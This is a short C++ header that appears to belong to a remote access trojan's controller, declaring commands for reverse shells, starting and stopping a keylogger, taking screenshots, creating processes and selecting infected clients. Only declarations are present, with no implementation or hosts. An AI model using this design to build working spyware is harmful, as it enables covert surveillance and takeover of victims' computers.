#pragma once

#include <map>
#include <memory>

#include "ICommunicationFactory.h"
#include "IRatManager.h"
#include "SharedSpan.h"

enum CommandType {
	SendChatMessage,
	ListClients,
	Help
};

class Entrypoint
{
public:
	Entrypoint();

private:
	void Startup();

	void SendChatMessage() const;
	void SendCreateProcess() const;
	void SendReverseShell();
	void SendTakeScreenshot();
	void SendStartKeyLogger();
	void SendStopKeyLogger();
	void ListClients() const;
	void SelectClient();

	void ParseInput();
	void ValidateSelection() const;

	std::map<std::string, std::function<void()>> _commands;
	std::unique_ptr<ICommunicationFactory> _factory;
	std::unique_ptr<IRatManager> _manager;

	std::unique_ptr<int> _client = std::make_unique<int>(0);

	std::string _command;
	SharedSpan _commandSpan;

	std::string _args;
	SharedSpan _argsSpan;
};

